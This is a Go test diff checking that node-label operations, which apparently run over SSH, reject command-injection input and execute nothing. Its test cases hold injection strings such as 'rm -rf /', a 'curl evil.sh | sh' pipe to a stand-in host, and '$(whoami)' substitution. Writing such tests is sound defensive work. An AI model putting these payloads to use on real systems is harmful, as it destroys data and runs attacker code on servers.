@@ -53,3 +53,50 @@ func TestManageNodesUseCase_Operations(t *testing.T) {
 		t.Fatalf("unexpected error removing label: %v", err)
 	}
 }
+
+func TestManageNodesUseCase_RejectsCommandInjectionInLabels(t *testing.T) {
+	mockSSH := mocks.NewMockSSHExecutor()
+	uc := NewManageNodesUseCase(nil, mockSSH)
+	config := domain.ServerConfig{Host: "127.0.0.1"}
+
+	tests := []struct {
+		name   string
+		action func() error
+	}{
+		{
+			name: "AddNodeLabel rechaza clave con inyección de comando",
+			action: func() error {
+				return uc.AddNodeLabel("node-1", "tier; rm -rf /", "frontend", config)
+			},
+		},
+		{
+			name: "AddNodeLabel rechaza valor con inyección de comando",
+			action: func() error {
+				return uc.AddNodeLabel("node-1", "tier", "frontend && curl evil.sh | sh", config)
+			},
+		},
+		{
+			name: "AddNodeLabel rechaza nodeID con inyección de comando",
+			action: func() error {
+				return uc.AddNodeLabel("node-1 $(whoami)", "tier", "frontend", config)
+			},
+		},
+		{
+			name: "RemoveNodeLabel rechaza clave con inyección de comando",
+			action: func() error {
+				return uc.RemoveNodeLabel("node-1", "tier`id`", config)
+			},
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			if err := tc.action(); err == nil {
+				t.Fatal("expected error, got nil")
+			}
+			if len(mockSSH.CommandsExecuted) != 0 {
+				t.Fatalf("no debería haberse ejecutado ningún comando SSH, se ejecutaron: %v", mockSSH.CommandsExecuted)
+			}
+		})
+	}
+}
